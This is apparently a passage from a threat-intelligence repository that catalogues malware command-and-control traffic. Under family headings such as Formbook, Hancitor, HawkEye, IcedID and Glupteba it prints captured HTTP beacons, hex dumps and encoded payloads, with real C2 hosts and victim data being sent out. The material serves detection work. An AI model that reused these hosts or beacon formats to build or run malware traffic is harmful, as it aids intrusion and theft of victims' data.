Server: nginx/1.12.2
Date: Tue, 15 Oct 2019 16:27:41 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
Connection: keep-alive

POST /new/new?type=name HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
Accept: */*
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0
Content-Length: 306
Host: moviedvdpower.com

lwirwavfynacqo=PG_EG%08%5BCXV%1Eo%04%02%08%01%00j%01%01%06%05%16BC%08%05%01%05%13CUTGUD%0AT%00%04%0F%01%08T%05WUR%05%01%02U%0F%07S%08%03%02%07S%03%07%09%05%0E%00U%05V%13DYZP%0D%01%05%05%00%00%07%13EYS%08%06%02%05%13YT%0A%00%02%0A%02%01%0A%00%07%0F%04q%0Dtt%0A%05%04oeDPB%1Dgv%16@VRUo%5EQ%0D%5ERB%26_%267500
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/fin7jsbackdoor.png "Fin7 JS Backdoor")

#### Firebird RAT
~~~
00000000  53 00 00 00 00 00 00 00                            S....... 
00000008  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00   ........ ........
00000018  00 06 01 00 00 00 3b 56  5c 5a 48 4b 05 67 66 3c   ......;V \ZHK.gf<
00000028  22 0c 04 13 14 10 41 41  32 02 1c 06 08 06 2e 5b   ".....AA 2......[
00000038  5b 24 0c 1f 1a 5a 4d 59  61 50 32 15 01 0a 1f 5a   [$...ZMY aP2....Z
00000048  29 53 56 2b 43 59 15 34  3d 3d 03 0c 3c 22 0c 04   )SV+CY.4 ==..<"..
00000058  13 14 0b                                           ...
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/firebird.png "Firebird")

#### Flawedammyy
~~~
= ..">h..K...t.......N<.
.Q..1....%S-.8z...id=53292686&os=7 SP1 x86&priv=User+UAC&cred=USER-PC\admin&pcname=USER-PC&avname=&build_time=08-08-2019 14:24:35 PM&card=0&
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/flawedammyy.png "Flawedammyy")

#### Formbook
formbook hostnames are almost always www
~~~
POST /k9m/ HTTP/1.1
Host: www.liuhe127.com
Connection: close
Content-Length: 3769
Cache-Control: no-cache
Origin: http://www.liuhe127.com
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Content-Type: application/x-www-form-urlencoded
Accept: */*
Referer: http://www.liuhe127.com/k9m/
Accept-Language: en-US
Accept-Encoding: gzip, deflate

Sbh=A2oUV0jxRNQErH6gY3lxQtOCTuQwNTdWJ25sTcda3oav(0QcLnkBrePt5vgAKuqyhbAftuJA5G5D2fNVsLRL8o7GMMvu8SY6wR8pwXAraJm4TKmuw5(TglqswaX2VpD_gJ3yal4FZ1pkDvEP81iuj_l_mMoqsdCGaFMxmu8LQC1CZjkxIXbFtlEaQg0Wfzvxpk9XRS39rZxxdqjALdRL8_N2LHRzPN35WuoIIn2J0mUB7u7x~42TwXHpZcLTJ4cELO23a_seXaFdgz~QWrxi7L3N9oGrwrY4tSxRUCsHQCoAB8CsxlUDIkY67TYTnYPmJxKxE06yA9NA5buPXUU-rDGiNGDQ25(b371m2NNnyheUxDNxyL6wr0syvlQ7Qn~DvzJO1j4_01FUfdeQKDmT9nuRD7AXJYaO3DIZnG1RWkvBxF0H38hB8-R7b1kP1IZqlFNLuC1ttRMUWPoRYyiYb-5rzJXywgOQncCVwVXcwH8dkVBf8nIw1doGRbV0yBZciG1vmCQMiyqspdkDVZt-1KyQhCCDaZWgyx(jUEtrJ5ZzRRfL7eaLGAG1u46ihMFAoJdDXorJcFL051WdJ2wHBfyMv2c9wu1j78lVpEWNkON2Qnw-8VOoQrg4ItHc4WjdsmkjCk(8A-d-uwY70GE0UXkWhPpg~_8qCqj_XNsXD1Cku4u0im9ibvYCLeQyYDn_FmL-U7ZNtOIbYeTHchiTz3fwdILdormZDVBuDzJlRACku5YKuqCIZoTnxUBI(iGkeX0da3GEkWCi8MA6nuA390kyWjwjSpzGHFYPG0B41C5bU5KrJx(9qiFYNfQPZqv5KDyJL8tN7jrqIny7WzTVRqvRHCeerIFPL5vosxC_3QvH2AlElM8Ssx(QZqz22ySsvMzyq8Hv~3tMLtg8mgzByn2dH2WrNAM3nk~XXu(6GurJtah4M9tPmohFGPLZxX5e3WCJ~h16eNNM4OaV~MOGVYusVrPgqFUS6P7iizTBZS(MsulNfuAKYvUq2kUMtCYSZAt34TUY6bJ5BTPy~4ydE8n16XohSRP8VbqhLAZ4DGO2n-hfrK2o9oUsNUWcpZyKA2(9kXBftM3s5lzWT21wBKbcPaiPURUuV4eheOkTBTxTB_mMxCafVVE6yvbJD-XIpSazCu(sS7~QUEbh6EPrqsB11rhKlRPy39G2rLo6lSMHeGjCmI5Rc80lhtZyFKcqhNYbhwuiEn3uK9CodgYxVie6yY1MwI(M8VSBZ-zQjldjXnFN~7oKDW3JglzgbK3lzeDK5aRb0HTwohxi8M9lRkTKflhtcr77iOlBVcE6HYSbchngmsBWBgPwA75xvzJhUUtgjJlxLW~bSPMG7x7GLVfCZjxxrjki0R9ZPDVdx71eP4yoIdymwRgqddVSuGCAIf641vyoItI9QzfvvuZBdpRQi3ZEw7LUifYAyjYZ2Xd9KdOMiNiLLeLsDCgWib~5r8iSfExWtFjsEgOt(2W_0JQSAgplkqJxkO9YxSdB9xsPfeavxYirf7azw7UGnDTEMQUnMMECFM5_v29oh6tKvIolHPv_qZrW0nGwd0aCMfzUqcV0(NlfiEQOxVZTonlWkJoR3hyyZQ~dKGW9j_WbA-8s54GvC-VC~skS2jG4haG9bxKA6QZqRK4-2qI5o2U3rNoeQEz_~yMfZ2fQoftvSkgpJfcgjuh3qTOFK8b6OSe5wMnyLdniF_4xN3rO(73lGUB5l60LbBa4TAYc(Qn7pyfvhlhMx8nr0vm6kCom1xi-VN1M(fSDqNubOVR_8QORONDFaX41G3HYOrWQyQ5Cvd6lAFgWycF3KeaumEH0LEUP7vR3t8CqgQ5VqyDxtKNy0Z7MVbqsq6s8~aYdnUL5DxSG9pbe8LW4uDqLcBuZ2WiDWmdiRx0cbf9-s0qx6mSwAo(Wz67SmWp2X8VI3W4h3M3vf9BggKJQmHp7nLChKFWJWTuEGt43fxqjimz5WaRYtGOcdlH84XYvX9kEB1C4(Fp99P6VKHhrkuCOrtiirAvl7KvjXYhsiOn20cjKKUL6l8(aZofg6g(CqTpB5dDGN86Korg1L6advz28Cc9QidH5ZPIAHrWXi9nG5FtnBxG-3R2N(J6V~IGsC8NZIwv0qB~35YLhS9SlyD38(p(pgy9N3fPHO9Gzlzd6D3j74fN-N89jhcQTClusyQIhdjrYsqWnpi7Of2Hl9zRx(ut-kFP33A5zYLbDn54f9gg8kH1m(BeKfVXxVtpGLR4VQSBfZzVwPGnUei9aJDZkXwmg0xftRV~S3TxUucpU1d75Pa9NCvgMU51f7uv0XtF1S-0_nqUy(apdab1FJcSzLOVDXJDyOKr5P4px5QpKM1FZgH9mgQQZuo~rlcBi4jISUNx3qv7fwaBZ4KDYuICC1-KLeFh0i7YEU_njjPm31uzkYLlVxfbhAg6C7Fxcpr5_jzhW~me85m48ifV4C06qNAN5WgIGxJW07CUNAuLx2d4tZI85EWgoxQa3AOuINyalNllQZt2LBB~ReVqa8Gr3pLpZOSiDREVqDaruTFqNwAZndKWZ~CTIV4ss6txpH7ypXw3AZ4fiDn5j7NDtaJzXbptIpWgrv9yK(zab71BYxnEuPpsdZSnA2QWY9s300CraaT3RPj(gdt~5OjaG22qma1M9LYzgvBdIBH57aizchPopkjnWiJAuvabKSvJyEtKb5Ni67H1WbOnOKM8pMcqsaIBi1AfQV0PbikKmG-HikPS86JBnJXZs8BWrbgm7g8uGrVpnnuHbHuP4p4xAOgYNPDbnpSoXn0kH~vUc1JxLurnAnNWMmYgA5g3fIw7HGvJSnKn6DDHod7HUKWF3ggfFJdZbucZxbJ2fpE64O6nKFy9It-R0BRZqcunVVvWy4zwCQ_1brWO78sSQY3WY4Es8kI6nl5hc9k3dhAWgQJWeqVrUGnOyxnf3wP9Tjc3fbhhfMthKeTVJEn485mDsUhxaOlIUrAoNDk1Kmua8F3zzcHpo~ixmjApivEsgkkIIni~mHnw4sce0IaJmWT9Ka_FCRQTC3dNAkBJHjcfTsYpgDvJBeZI8V7tnXTcJwQShoQoTdzOUvebgdia2s6HyC8Ay3lybE0Kvi4Ufu2qeJDnpSdiZAi8Ba-AzxnhL~66T~sQU0SY1ZDTJsdMD9zA8h5A0g71lMEIFSEdczwnvBeXpuEiaX9FOoJQwoIyyq4KmaeML~f5ipBL5MgqKf36tQ4N9jiM0IMAZdarP~ZkdSRs6dnJ7bU4FFMvQUrM0EGSJMQfLAvB7d_c0IwGUl44oifYX7n8cNJQcRPEFt1PZYPKE47I_JQ2CSVE9Scfi6hmF2mrjjozj0NQFcK5B~W~c3GpQxJ8e9cNoWhrkZNK1CyKcuTjHkfWA5Bzoi5p5mrTFsA12M25Ubt5SuEd-grtNyFbdev6Uyoislno4UJ9J6-8ag6iZXJd_QI17cAFS4P71bi7ApOh50qN4cNMIQBUTQyriS5BG~os6RMAuoaSUq92eNx12764W~RIGssW6ItGJFcg09D9nPLTs9jUhkhVwPicIhcak5ZLrkASapi44847mp8bI7hAIINPrZaKEyXejiDm5OUm7UVGno15_(251Jq3-Aic6sgovlTvlWBTFSkikUCmSMDX96nLlTuNiC2BD42WLJfGoZQw4T341YKl3rFShZ24mtmUGThc4k-k1OxGK1ygo5wLOg_H_Bs9MfxPn3aoIQiBq(XC7l4Xzw2LREItIvFPQXoWU(dxz3g)..
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/formbook.png "Formbook")

#### GET2Loader (TA505):
~~~
POST /2021 HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
Content-Length: 95
Host: windows-sys-update.com

&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
Server: nginx/1.10.3
Date: Wed, 09 Oct 2019 18:53:18 GMT
Content-Length: 0
Connection: keep-alive
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")

#### Glupteba
~~~
POST /bots/post-ia-data?uuid=de7cfeb2-8d6a-480d-9043-488b8a616d7b HTTP/1.1
Host: venoxcontrol.com
User-Agent: Go-http-client/1.1
Content-Length: 8843
Content-Type: application/json; charset=UTF-8
Accept-Encoding: gzip

[{"display_name":"Security Update for Microsoft Office 2010 (KB2289161)","display_version":"","install_date":""},{"display_name":"DXM_Runtime","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2012 x64 Additional Runtime - 11.0.61030","display_version":"11.0.61030","install_date":"20180208"},{"display_name":"Microsoft Office Proof (French) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Security Update for Microsoft Office 2010 (KB2289078)","display_version":"","install_date":""},{"display_name":"Microsoft Outlook Social Connector (KB2289116) ..........s","display_version":"","install_date":""},{"display_name":"Definition update for Microsoft Office 2010 (KB982726)","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Publisher 2010 (KB2409055)","display_version":"","install_date":""},{"display_name":"IEData","display_version":"","install_date":""},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB2151757","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2019 X64 Additional Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Microsoft Office Proof (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Shared 32-bit MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.21.27702","display_version":"14.21.27702.2","install_date":""},{"display_name":"Microsoft Office Professional 2010","display_version":"14.0.4763.1000","install_date":""},{"display_name":"Microsoft Office Publisher MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Outlook MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft Office 2010 (KB2202188)","display_version":"","install_date":""},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB2467173","display_version":"","install_date":""},{"display_name":"Google Update Helper","display_version":"1.3.33.23","install_date":"20190319"},{"display_name":"IE40","display_version":"","install_date":""},{"display_name":"IE4Data","display_version":"","install_date":""},{"display_name":"Java 8 Update 92 (64-bit)","display_version":"8.0.920.14","install_date":"20180208"},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"VLC media player","display_version":"2.2.6","install_date":""},{"display_name":"WinRAR 5.60 (64-bit)","display_version":"5.60.0","install_date":""},{"display_name":"Microsoft Office Single Image 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Access Setup Metadata MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Adobe Flash Player 27 PPAPI","display_version":"27.0.0.187","install_date":""},{"display_name":"Microsoft Visual C++ 2019 X86 Additional Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Mozilla Firefox 67.0.4 (x64 en-US)","display_version":"67.0.4","install_date":""},{"display_name":"SchedulingAgent","display_version":"","install_date":""},{"display_name":"Microsoft Office Excel MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Office Shared MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Skype... 7.39","display_version":"7.39.102","install_date":"20180208"},{"display_name":"CCleaner","display_version":"5.35","install_date":""},{"display_name":"Microsoft .NET Framework 4.7.2","display_version":"4.7.03062","install_date":"20190321"},{"display_name":"Microsoft Office Access MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft Office 2010 (KB2413186)","display_version":"","install_date":""},{"display_name":"Adobe Acrobat Reader DC MUI","display_version":"15.007.20033","install_date":"20180208"},{"display_name":"MPlayer2","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161","display_version":"9.0.30729.6161","install_date":"20180208"},{"display_name":"Microsoft Office Proofing (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Microsoft Office Proof (Spanish) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.21.27702","display_version":"14.21.27702","install_date":"20190321"},{"display_name":"Adobe Flash Player 27 ActiveX","display_version":"27.0.0.187","install_date":""},{"display_name":"Adobe Flash Player 27 NPAPI","display_version":"27.0.0.187","install_date":""},{"display_name":"Google Chrome","display_version":"75.0.3770.100","install_date":"20180208"},{"display_name":"Microsoft Office Word MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Update for Microsoft OneNote 2010 (KB2433299)","display_version":"","install_date":""},{"display_name":"Microsoft Office OneNote MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005","display_version":"12.0.21005","install_date":"20180208"},{"display_name":"{1D8E6291-B0D5-35EC-8441-6616F567A0F7}.KB982573","display_version":"","install_date":""},{"display_name":"Realtek AC'97 Audio","display_version":"","install_date":""},{"display_name":"MobileOptionPack","display_version":"","install_date":""},{"display_name":"Microsoft Office PowerPoint MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.21.27702","display_version":"14.21.27702.2","install_date":""},{"display_name":"Update for Microsoft .NET Framework 4.7.2 (KB4087364)","display_version":"1","install_date":""},{"display_name":"Microsoft Visual C++ 2012 Redistributable (x64) - 11.0.61030","display_version":"11.0.61030.0","install_date":""},{"display_name":"AddressBook","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Word 2010 (KB2345000)","display_version":"","install_date":""},{"display_name":"Microsoft Office Shared Setup Metadata MUI (English) 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Microsoft .NET Framework 4.7.2","display_version":"4.7.03062","install_date":""},{"display_name":"Connection Manager","display_version":"","install_date":""},{"display_name":"Fontcore","display_version":"","install_date":""},{"display_name":"Security Update for Microsoft Office 2010 (KB2289161)","display_version":"","install_date":""},{"display_name":"Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005","display_version":"12.0.21005","install_date":"20180208"},{"display_name":"Mozilla Maintenance Service","display_version":"67.0.4","install_date":""},{"display_name":"Notepad++ (64-bit x64)","display_version":"7.5.1","install_date":""},{"display_name":"WIC","display_version":"","install_date":""},{"display_name":"QEMU guest agent","display_version":"2.10.68","install_date":"20190730"},{"display_name":"Update for Microsoft Outlook Social Connector (KB2289116)","display_version":"","install_date":""},{"display_name":"Microsoft Office Office 32-bit Components 2010","display_version":"14.0.4763.1000","install_date":"20180126"},{"display_name":"Java Auto Updater","display_version":"2.8.92.14","install_date":"20180208"},{"display_name":"DirectDrawEx","display_version":"","install_date":""},{"display_name":"IE5BAKEX","display_version":"","install_date":""},{"display_name":"Opera 12.15","display_version":"12.15.1748","install_date":""},{"display_name":"Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219","display_version":"10.0.40219","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2005 Redistributable (x64)","display_version":"8.0.61000","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2012 x64 Minimum Runtime - 11.0.61030","display_version":"11.0.61030","install_date":"20180208"},{"display_name":"Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.30501","display_version":"12.0.30501.0","install_date":""}]
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-1.png "Glupteba")
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/glupteba-2.png "Glupteba")

#### Godzilla Loader
~~~
GET /gate16.php?g=-994429369&k=7NLp9MrFuKWnfhYAmxKEcsWO2 HTTP/1.1
Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: filesdb.ru
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 01 Sep 2018 12:12:58 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Keep-Alive: timeout=60
Set-Cookie: PHPSESSID=btq14ialn2bbefrsvedfspt9s4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Encoding: gzip

<div id="s">IKqglmKsWN8CSCWpwIItt6O/sFpxceFdZPucGXeeUi1CbtjgXllqiSnOcsojWNxNP8ySG4XsKU94bKJh2vFSAtqb+g939WslRHMzKsr2YaDwN51PG9a/CZ/BVaK3Idznf3tkNJAy9+6r6vj/9spjxPp1+pqK3DrdVr7uJG0xkSv8Ez7fmCPgc4YrHpSk2cMvODT9bbv1eNE4zjGd+N4t3Lhp/+k48QWtGIQ48A6Q9HzhWO1L4SpVawEVg/hbN+EJSCVhQCIljVpvrcyeY6w1yX9QT5TSZosQlbzog3mLceYYz1teNlHwhGToXVDb9ACyxlo/FrdlapR/R0jCx0F+OQ==</div>
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/godzilla.png "Godzilla Loader")

#### GrandSteal
~~~
GET /websocket HTTP/1.1
Host: 162.218.122.115:2012
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: Yzg2MDllOTctZGYzMCOOZQ==
Origin: ws://162.218.122.115:2012

HTTP/1.1 101 Switching Protocols
Server: nginx
Date: Fri, 18 Oct 2019 00:41:37 GMT
Connection: upgrade
Upgrade: WebSocket
Sec-WebSocket-Accept: 3pYl7XQW+GMu4ydBWBEUXbuIKJo=

.þ... o>..Í8).i<. e-_A.Mjc.WjN.mjT.WaG.,.U.SnJ%._y.>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>
. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>
. o>. o>. o>. o>. o>. o>. o>. o>. o>. o>

.~..."ª..Ê.......... .(.8.@...ugmajJAPYc
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/grandsteal.png "GrandSteal")

#### Hancitor
~~~
POST /4/forum.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Host: spausence.com
Content-Length: 108
Cache-Control: no-cache

GUID=8996434259757519954&BUILD=0210_328487&INFO=USER-PC @ USER-PC\admin&IP=89.187.165.57&TYPE=1&WIN=6.1(x64)HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Thu, 03 Oct 2019 17:17:51 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/5.4.45

FFUUARZAEg4OCkBVVQ0NDVQVFB8eEx0TGBUCVBkVF1UNClcZFRQOHxQOVQoWDx0TFAlVCRcbCA5XCRYTHh8IV0lVExQZFg8eHwlVSwYSDg4KQFVVDQ0NVA4SGVcbFBQfAlQZFRdVDQpXGRUUDh8UDlVLBhIODgpAVVUXGw4fCBMbFlcUHwgPHlQID1UNClcTFBkWDx4fCVUKFRcVVUsGEg4OCkBVVRkWHwwfCB8eDxkbDhMVFFQZFRdUGw9VDQpXExQZFg8eHwlVDRMeHR8OCVVLBhIODgpAVVUfGRsIHwoSVBUIHVUNClcZFRQOHxQOVQoWDx0TFAlVGBgKFQ0fCAobGRFVExQZFg8eHwlVSwcBGEASDg4KQFVVDQ0NVBUUHx4THRMYFQJUGRUXVQ0KVxkVFA4fFA5VChYPHRMUCVUJFxsIDlcJFhMeHwhXSVUTFBkWDx4fCVVIBhIODgpAVVUNDQ1UDhIZVxsUFB8CVBkVF1UNClcZFRQOHxQOVUgGEg4OCkBVVRcbDh8IExsWVxQfCA8eVAgPVQ0KVxMUGRYPHh8JVQoVFxVVSAYSDg4KQFVVGRYfDB8IHx4PGRsOExUUVBkVF1QbD1UNClcTFBkWDx4fCVUNEx4dHw4JVUgGEg4OCkBVVR8ZGwgfChJUFQgdVQ0KVxkVFA4fFA5VChYPHRMUCVUYGAoVDR8IChsZEVUTFBkWDx4fCVVIBwEIQBIODgpAVVUNDQ1UFRQfHhMdExgVAlQZFRdVDQpXGRUUDh8UDlUKFg8dExQJVQkXGwgOVwkWEx4fCFdJVRMUGRYPHh8JVUkGEg4OCkBVVQ0NDVQOEhlXGxQUHwJUGRUXVQ0KVxkVFA4fFA5VSQYSDg4KQFVVFxsOHwgTGxZXFB8IDx5UCA9VDQpXExQZFg8eHwlVChUXFVVJBhIODgpAVVUZFh8MHwgfHg8ZGw4TFRRUGRUXVBsPVQ0KVxMUGRYPHh8JVQ0THh0fDglVSQYSDg4KQFVVHxkbCB8KElQVCB1VDQpXGRUUDh8UDlUKFg8dExQJVRgYChUNHwgKGxkRVRMUGRYPHh8JVUkH
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hancitor.png "Hancitor")

#### Hawkeye keyogger
~~~
From: mosharrof@mhcapparels.com
To: mosharrof@mhcapparels.com
Date: 9 Oct 2019 01:57:35 +0100
Subject: HawkEye Keylogger - Reborn v9 - Passwords Logs - admin \ USER-PC -
 89.187.165.47
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64

SGF3a0V5ZSBLZXlsb2dnZXIgLSBSZWJvcm4gdjkNClBhc3N3b3JkcyBMb2dzDQphZG1p
biBcIFVTRVItUEMNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT0NClVSTCAgICAgICAgICAgICAgIDogaHR0cHM6Ly9tLmZhY2Vi
b29rLmNvbQ0KV2ViIEJyb3dzZXIgICAgICAgOiBGaXJlZm94IDMyKw0KVXNlciBOYW1l
ICAgICAgICAgOiBob25leUBwb3QuY29tDQpQYXNzd29yZCAgICAgICAgICA6IGhvbmV5
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/hawkeye.png "Hawkeye")

#### Icedid
~~~
GET /photo.png?id=0181B9BACBCF3080870000000000FF40000001 HTTP/1.1
Connection: Keep-Alive
Host: eurobable.com

HTTP/1.1 200 OK
Server: openresty
Date: Wed, 16 Oct 2019 15:30:33 GMT
Content-Type: application/octet-stream
Content-Length: 605211
Connection: keep-alive
Last-Modified: Tue, 08 Oct 2019 11:43:19 GMT
ETag: "5d9c7657-93c1b"
Accept-Ranges: bytes

.PNG
.
...
IHDR..............N.T....sRGB.........gAMA......a....	pHYs..........o.d.	;.IDATOLrEV.....Le.D|...Rp.{..D...g`...a@.\8,E
.~1Z..X.N...^G.....,f$.c.......ru.#O..'.~.
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid-2.png "Icedid")

URI for websocket is usually data2.php
~~~
GET /data2.php?1C00C7CC98D464FE HTTP/1.1
Host: memphase.com
Upgrade: websocket
Connection: Upgrade

HTTP/1.1 101 Switching Protocols
Server: openresty
Date: Thu, 10 Oct 2019 19:28:34 GMT
Connection: upgrade
Sec-WebSocket-Accept: Kfh9QIsMVZcl6xEPYxPHzW8SZ8w=
Upgrade: websocket
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedid.png "Icedid websocket")

New Loader
~~~
GET / HTTP/1.1
Connection: Keep-Alive
Host: karantino.xyz

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Mar 2020 16:07:26 GMT
Content-Type: text/html
Content-Length: 489
Connection: keep-alive
Last-Modified: Wed, 29 Jan 2020 08:16:06 GMT
ETag: "5e313f46-1e9"
Accept-Ranges: bytes

<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">

		<title>Site under reconstruction</title>
		<style>
		body
		{
			height:				90vh;
			background-color: 	#59BAB1;
			background-image:	url("background.png");
			background-repeat:	no-repeat;
			background-size: 	contain;
		}
		</style>
	</head>
	<body>
	</body>
</html>
GET /background.png

HTTP/1.1
Connection: Keep-Alive
Cookie: __gads=3341780230:0:418500:437:83; _gat=10.0.16299.64; _ga=1.329443.0.66; _u=4445534B544F502D4A474C4C4A4C44:61646D696E; __io=21_1693682860_607145093_2874071422; _gid=92AA106A8DB0
Host: karantino.xyz

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Mar 2020 16:07:27 GMT
Content-Type: image/png
Content-Length: 314160
Connection: keep-alive

.PNG
.
...
IHDR...............#&....sRGB.........gAMA......a....	pHYs..."...".........IDATx^....lKz..e....>...0.f.s.... f...`...J..."$...!Qv.a9...p..............6....|...+..#.2M.2
~~~
![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedidloader.png "IcedID Loader")

#### iDex Stealer
~~~
GET /index.php HTTP/1.1
Host: etips.fun
Connection: Keep-Alive

HTTP/1.1 200 OK
Server: nginx-reuseport/1.13.4
Date: Fri, 03 Apr 2020 12:43:55 GMT
Content-Type: text/html
Content-Length: 216
Connection: keep-alive
Keep-Alive: timeout=30
Vary: Accept-Encoding
X-Powered-By: PHP/7.1.33
Set-Cookie: PHPSESSID=f9eaff206353e78017c4257960c13590; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

YZAt44SJ3KsHldzHPnF8nveX4cBoS359sHzCXSUuwew/C6IEa7/zMjViaOVMK2EMfO1X+lcr24gD5S4LRuHREupBfWGdnGzfg5brXc1OuiMTRnOZ/iS9Vps9/B7Q+08m/137OU7V41UEx2QckwuZ9KeDTSjzmMv32Eewq0GUPiyQ5iFOOZ+8jGOXC1v8CsVqFfJYpKC2cCSLIQWDi6VzrQ==

POST /gate.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accepts-Language: en-us,en;q=0.5
Content-Type: multipart/form-data; boundary=---------------------------8d7d7ccad7ce23c
Host: etips.fun
Content-Length: 1191325
Expect: 100-continue

-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="hwid"

EEEB5D54788042A7B542739BBC26CF4B
-----------------------------8d7d7ccad7ce23c
Content-Disposition: form-data; name="os"

Windows 7 x64
